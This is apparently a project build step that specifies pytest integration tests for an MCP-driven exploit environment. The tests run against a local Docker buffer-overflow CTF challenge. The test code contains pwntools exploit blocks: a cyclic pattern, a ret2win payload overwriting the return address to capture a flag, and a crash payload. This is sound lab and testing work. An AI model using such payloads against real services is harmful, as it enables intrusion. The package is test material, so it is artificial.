# Step 14 — Full-Stack Integration Test

**Reference docs:** None — this step verifies the complete system against the example-bof challenge.

**Docker required:** Yes — all three containers must be running.

---

## What to Build

`tests/integration/test_full_stack.py` — a test suite that exercises the complete exploit workflow using the example-bof challenge and the MCP tool API.

Also create `tests/conftest.py` with shared fixtures.

---

## conftest.py

```python
# tests/conftest.py
import pytest
import asyncio

@pytest.fixture(scope="session")
def event_loop():
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()

MCP_URL = "http://localhost:8080/mcp"
CHALLENGE_HOST = "challenge"    # Docker service name
CHALLENGE_PORT = 4444
```

---

## Helper: MCP Client

```python
# tests/integration/test_full_stack.py

import pytest
import json
import asyncio
from mcp import ClientSession
from mcp.client.streamable_http import streamable_http_client

MCP_URL = "http://localhost:8080/mcp"
CHALLENGE_HOST = "challenge"
CHALLENGE_PORT = 4444

# win() address and offset discovered in Step 02
# Update these values with the actual values from your build:
WIN_ADDR = 0x401234    # <-- replace with actual address from Step 02
EXPLOIT_OFFSET = 72    # <-- replace with actual offset from Step 02

async def call_tool(tool_name: str, args: dict) -> dict:
    async with streamable_http_client(MCP_URL) as (read, write, _):
        async with ClientSession(read, write) as session:
            await session.initialize()
            result = await session.call_tool(tool_name, args)
            return json.loads(result.content[0].text)

async def call_tool_with_progress(tool_name: str, args: dict) -> tuple[dict, list[dict]]:
    """Call a tool and collect all progress notifications."""
    progress_events = []

    async def on_progress(progress, total, message):
        if message:
            try:
                progress_events.append(json.loads(message))
            except json.JSONDecodeError:
                progress_events.append({"raw": message})

    async with streamable_http_client(MCP_URL) as (read, write, _):
        async with ClientSession(read, write) as session:
            await session.initialize()
            result = await session.call_tool(
                tool_name, args,
                progress_callback=on_progress
            )
            return json.loads(result.content[0].text), progress_events
```

---

## Test Suite

### Test 1: Full exploit workflow — run_to

```python
async def test_full_exploit_run_to():
    """
    Complete workflow: create session, write two blocks, run to block 2,
    verify flag was captured.
    """
    # Step 1: Create session
    result = await call_tool("new_session", {
        "challenge_host": CHALLENGE_HOST,
        "challenge_port": CHALLENGE_PORT,
    })
    assert result["ok"] is True, f"new_session failed: {result}"
    assert result["session"]["frontier"] == 0
    assert result["session"]["pid"] is not None
    pid = result["session"]["pid"]
    print(f"  Session created. pid={pid}")

    # Step 2: Add exploit block 1 (send cyclic payload)
    result = await call_tool("add_block", {
        "index": 1,
        "type": "exploit",
        "source": f"payload = cyclic(200)\nconn.sendline(payload)\nprint(conn.recvuntil(b'\\n', timeout=2))",
    })
    assert result["ok"] is True
    block_1_id = result["block_id"]

    # Step 3: Add exploit block 2 (send real payload, capture flag)
    exploit_source = (
        f"from pwn import *\n"
        f"win_addr = {hex(WIN_ADDR)}\n"
        f"payload = flat({{{EXPLOIT_OFFSET}: p64(win_addr)}})\n"
        f"conn.sendline(payload)\n"
        f"final_flag = conn.recvline(timeout=3).decode().strip()\n"
        f"print(f'Got: {{final_flag}}')\n"
    )
    result = await call_tool("add_block", {
        "index": 2,
        "type": "exploit",
        "source": exploit_source,
    })
    assert result["ok"] is True
    block_2_id = result["block_id"]

    # Step 4: Run to block 2 (clean restart)
    result, progress = await call_tool_with_progress("run_to", {"target": "2"})
    assert result["ok"] is True, f"run_to failed: {result}"
    assert result["frontier"] == 2

    # Step 5: Verify final_flag was captured
    assert result["final_flag"] is not None, "final_flag not set"
    assert "CTF{" in result["final_flag"], f"Unexpected flag: {result['final_flag']}"
    print(f"  Flag captured: {result['final_flag']}")

    # Step 6: Verify with challenge-env
    result = await call_tool("verify_flag", {"flag": result["final_flag"]})
    assert result["ok"] is True
    assert result["correct"] is True, f"Flag verification failed: {result}"
    print("  Flag verified!")
```

### Test 2: step() and continue() workflow

```python
async def test_step_and_continue():
    """
    Test that step and continue work correctly after initial run.
    """
    # Create session and add blocks
    await call_tool("new_session", {
        "challenge_host": CHALLENGE_HOST,
        "challenge_port": CHALLENGE_PORT,
    })

    # Add block 1: just receive the prompt
    await call_tool("add_block", {
        "index": 1, "type": "exploit",
        "source": "output = conn.recvuntil(b'input: ', timeout=3)\nprint(output)",
    })

    # Add block 2: send payload
    exploit_source = (
        f"win_addr = {hex(WIN_ADDR)}\n"
        f"payload = flat({{{EXPLOIT_OFFSET}: p64(win_addr)}})\n"
        f"conn.sendline(payload)\n"
        f"final_flag = conn.recvline(timeout=3).decode().strip()\n"
    )
    await call_tool("add_block", {"index": 2, "type": "exploit", "source": exploit_source})

    # Run to block 1 only
    result = await call_tool("run_to", {"target": "1"})
    assert result["ok"] is True
    assert result["frontier"] == 1

    # Use step() to run block 2 without restarting
    result, _ = await call_tool_with_progress("step", {"n": 1})
    assert result["ok"] is True, f"step failed: {result}"
    assert result["frontier"] == 2
    assert result["final_flag"] is not None

    verify = await call_tool("verify_flag", {"flag": result["final_flag"]})
    assert verify["correct"] is True
```

### Test 3: Reset on edit at frontier

```python
async def test_reset_on_edit_at_frontier():
    """
    Editing a block at or before frontier triggers reset.
    """
    # Create session with one block, run it
    await call_tool("new_session", {
        "challenge_host": CHALLENGE_HOST,
        "challenge_port": CHALLENGE_PORT,
    })
    add_result = await call_tool("add_block", {
        "index": 1, "type": "exploit", "source": "x = 1\nprint(x)",
    })
    block_1_id = add_result["block_id"]
    run_result = await call_tool("run_to", {"target": "1"})
    assert run_result["frontier"] == 1

    # Modify block 1 (at frontier) — should trigger reset
    mod_result = await call_tool("modify_block", {
        "block_id": block_1_id,
        "source": "x = 2\nprint(x)",
    })
    assert mod_result["ok"] is True
    assert mod_result["reset_triggered"] is True

    # Verify session was reset (frontier = 0)
    session_result = await call_tool("get_session", {})
    assert session_result["session"]["frontier"] == 0
```

### Test 4: step() fails after process crash

```python
async def test_step_fails_after_crash():
    """
    step() returns an error if the challenge process crashed.
    """
    # Create session, add a block that crashes the process
    await call_tool("new_session", {
        "challenge_host": CHALLENGE_HOST,
        "challenge_port": CHALLENGE_PORT,
    })
    await call_tool("add_block", {
        "index": 1, "type": "exploit",
        # Send a huge payload that will crash the process
        "source": "conn.sendline(b'A' * 500)\nconn.recvall(timeout=1)",
    })
    await call_tool("add_block", {
        "index": 2, "type": "exploit",
        "source": "conn.sendline(b'more data')",
    })

    # Run block 1 (crashes process)
    await call_tool("run_to", {"target": "1"})

    # Try to step to block 2 — should fail
    result = await call_tool("step", {"n": 1})
    assert result["ok"] is False
    assert "run_to" in result["error"] or "restart" in result["error"].lower()
```

### Test 5: GDB block attaches and captures output

```python
async def test_gdb_block():
    """
    A GDB block attaches to the challenge process and captures register state.
    """
    await call_tool("new_session", {
        "challenge_host": CHALLENGE_HOST,
        "challenge_port": CHALLENGE_PORT,
    })

    # Block 1: send cyclic payload (will crash process into GDB catch)
    await call_tool("add_block", {
        "index": 1, "type": "exploit",
        "source": "conn.sendline(cyclic(200))\nimport time\ntime.sleep(0.5)",
    })

    # Block 2: GDB inspection
    await call_tool("add_block", {
        "index": 2, "type": "gdb",
        "source": "info registers\nx/4gx $rsp",
    })

    result, progress = await call_tool_with_progress("run_to", {"target": "2"})
    assert result["ok"] is True, f"run_to with GDB block failed: {result}"
    assert result["frontier"] == 2

    # Verify GDB block has output containing register info
    session = await call_tool("get_session", {})
    gdb_block = next(b for b in session["session"]["blocks"] if b["index"] == 2)
    assert gdb_block["status"] == "done"
    assert "rsp" in gdb_block["output"].lower() or "rip" in gdb_block["output"].lower(), \
        f"GDB output missing register info: {gdb_block['output']}"
```

### Test 6: verify_flag returns false for wrong flag

```python
async def test_verify_flag_incorrect():
    await call_tool("new_session", {
        "challenge_host": CHALLENGE_HOST,
        "challenge_port": CHALLENGE_PORT,
    })
    result = await call_tool("verify_flag", {"flag": "CTF{wrong}"})
    assert result["ok"] is True
    assert result["correct"] is False
```

---

## Running the Full-Stack Tests

```bash
# 1. Build and start all containers
docker compose up -d --build

# 2. Wait for services to be ready (MCP server takes a few seconds)
sleep 10

# 3. Run full-stack tests
cd exploit-env
uv run pytest ../tests/integration/test_full_stack.py -v -s

# 4. If tests fail, check logs
docker compose logs exploit-env
docker compose logs challenge-env

# 5. Tear down
docker compose down
```

---

## Expected Output

A successful run looks like:

```
tests/integration/test_full_stack.py::test_full_exploit_run_to
  Session created. pid=12345
  Flag captured: CTF{example_bof_flag_for_testing}
  Flag verified!
PASSED

tests/integration/test_full_stack.py::test_step_and_continue PASSED
tests/integration/test_full_stack.py::test_reset_on_edit_at_frontier PASSED
tests/integration/test_full_stack.py::test_step_fails_after_crash PASSED
tests/integration/test_full_stack.py::test_gdb_block PASSED
tests/integration/test_full_stack.py::test_verify_flag_incorrect PASSED

6 passed in X.XXs
```

All 6 tests must pass. If any fail, debug using `docker compose logs` and fix the underlying issue before considering the project complete.

---

## Completion Checklist

When all integration tests pass, the project is complete. Final verification:

- [ ] `uv run pytest tests/unit/ -v` — all unit tests pass (no Docker required)
- [ ] `uv run pytest tests/integration/test_mcp_server.py -v` — MCP server tests pass (exploit-env + pyghidra-mcp running)
- [ ] `uv run pytest tests/integration/test_full_stack.py -v` — full-stack tests pass (all containers running)
- [ ] `docker compose down` — clean shutdown with no errors
- [ ] `docker compose up -d --build && sleep 10 && uv run pytest tests/integration/test_full_stack.py -v` — passes on a clean rebuild
